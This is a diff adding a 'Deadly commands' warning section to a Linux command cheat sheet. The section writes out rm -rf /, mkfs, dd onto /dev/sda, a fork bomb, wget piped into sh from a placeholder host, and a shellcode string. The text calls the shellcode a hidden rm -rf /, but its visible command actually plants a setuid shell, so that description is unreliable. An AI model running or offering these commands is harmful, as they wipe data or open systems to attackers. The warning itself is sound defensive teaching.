@@ -28,7 +28,7 @@ Remove folder
 
     rm -r folder-name
 
-Remove folder with no prompt. Be **Extremely** careful with the `rm -rf` command because you can wipe out the whole system with it.
+Remove folder with no prompt. Be **Extremely** careful with the `rm -rf` command because you can wipe out the whole system with it. See the **Deadly commands**
 
     rm -rf folder-name
 
@@ -117,3 +117,71 @@ Enable firewall:
 Check status:
 
     sudo ufw status verbose
+
+***
+
+# Deadly commands
+
+Someday, some asshole on a forum my try to ruin your life by tricking you into using these commands. Take a hard look and remember them. **Never** run any of the following:
+
+***
+
+## Delete all files in the root directory
+
+    rm -rf /
+
+This freaks me out just to write it. This means force a deletion of everything in the root directory and all subfolders without prompt. So basically wiping your entire system in 5 lines of code.
+
+There is "hidden" hex of this as well that looks like this.
+
+    char esp[] __attribute__ ((section(“.text”))) /* e.s.p
+    release */
+    = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68”
+    “\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99”
+    “\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7”
+    “\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56”
+    “\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31”
+    “\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69”
+    “\x6e\x2f\x73\x68\x00\x2d\x63\x00”
+    “cp -p /bin/sh /tmp/.beyond; chmod 4755
+    /tmp/.beyond;”;
+
+
+## Reformat Data on device
+
+    mkfs
+    mkfs.ext3
+    mkfs.anything
+
+Whatever follows the mkfs command will be destroyed and replaced with a blank filesystem.
+
+## Block device manipulation
+
+    any_command > /dev/sda
+    dd if=something of=/dev/sda
+
+Watch out for `/dev/sda` These commands cause raw data to be written to a block device. Often this will clobber the filesystem and cause total loss of data.
+
+Another similar command would be to drop all files into a black hole.
+
+    mv ~ /dev/null
+
+## Fork bomb
+
+    :(){:|:&};:
+
+This short line defines a shell function that creates new copies of itself until the system freezes, forcing a hard reset of the computer. Basically an internal DDOS attack.
+
+
+## Malicious code in Shell scripts
+
+    wget http://some_place/some_file -O- | sh
+
+Or similarly
+
+    wget http://some_place/some_file
+    sh ./some_file
+
+This may be trickier to spot as there are so many tools out there as package managers. Bottom line is don't execute a shell script from a fishy source. Mind the `-O- | sh` or `sh ./` commands.
+
+***
